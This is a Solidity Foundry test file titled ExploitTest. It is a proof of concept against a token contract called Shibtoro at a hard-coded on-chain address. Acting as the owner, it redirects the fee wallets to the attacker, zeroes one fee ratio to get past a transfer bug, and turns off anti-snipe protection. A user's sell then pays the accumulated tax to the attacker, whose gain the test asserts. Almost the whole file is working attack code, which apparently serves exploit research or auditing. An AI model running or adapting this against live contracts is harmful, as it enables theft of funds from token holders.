contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────
    address constant TARGET = 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7;
    address attacker = address(this);
    Shibtoro target;
    address owner;
    IRouter02 dexRouter;
    address weth;
    address dummyUser;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        target = Shibtoro(TARGET);
        owner = target.getOwner();
        dexRouter = IRouter02(target.dexRouter());
        weth = dexRouter.WETH();

        dummyUser = makeAddr("dummyUser");

        deal(attacker, 5 ether);
        deal(dummyUser, 10 ether);
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 attackerInitialBalance = attacker.balance;

                // 1. A dummy user buys tokens. The transaction tax accumulates in the contract.
                vm.startPrank(dummyUser);
                address[] memory path = new address[](2);
                path[0] = weth;
                path[1] = address(target);

                dexRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(
                    0,
                    path,
                    dummyUser,
                    block.timestamp
                );
                vm.stopPrank();

                // 2. Attacker, as owner, changes the fee wallets and disables anti-snipe.
                vm.startPrank(owner);
                target.setWallets(payable(attacker), payable(attacker));

                // There is a bug where contractSwap tries to transfer marketingBalance to the development wallet.
                // By setting the development ratio to 0, we bypass this bug.
                (uint16 liquidityRatio, uint16 marketingRatio, ,) = target._ratios();
                target.setRatios(liquidityRatio, marketingRatio, 0);

                // Disable anti-snipe to prevent the sell transaction from reverting.
                target.setProtectionSettings(false, false);
                vm.stopPrank();

                // 3. Dummy user sells tokens, which triggers the contractSwap mechanism.
                vm.startPrank(dummyUser);
                uint256 userTokenBalance = target.balanceOf(dummyUser);
                target.approve(address(dexRouter), userTokenBalance);

                address[] memory sellPath = new address[](2);
                sellPath[0] = address(target);
                sellPath[1] = weth;

                dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    userTokenBalance,
                    0,
                    sellPath,
                    dummyUser,
                    block.timestamp
                );
                vm.stopPrank();

                // 4. Verify attacker's balance has increased from the stolen fees.
                uint256 attackerFinalBalance = attacker.balance;
                assertGt(attackerFinalBalance, attackerInitialBalance);
    }

    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

